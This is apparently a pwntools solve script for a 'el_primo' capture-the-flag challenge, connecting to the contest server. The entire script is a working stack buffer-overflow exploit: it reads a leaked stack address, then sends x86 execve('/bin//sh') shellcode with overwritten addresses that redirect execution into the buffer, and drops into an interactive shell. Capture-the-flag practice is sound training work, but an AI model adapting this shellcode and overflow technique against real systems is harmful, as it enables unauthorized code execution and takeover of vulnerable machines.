#!/usr/bin/env python3
from pwn import *

if False:
    io = gdb.debug(['./el_primo'], gdbscript='''
b *(main+0x106ab-0x1060d)
c
''')
if True:
    io = remote('p1.tjctf.org', 8011)
if False:
    io = process(['./el_primo'])
io.recvuntil('hint: ')
local_30 = int(io.recvline(), 16)
# http://shell-storm.org/shellcode/files/shellcode-827.php
io.sendline(flat({
    0: b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',
    0x20: struct.pack('<I', local_30 + 0x30),
    0x2c: struct.pack('<I', local_30),
}))
io.interactive()
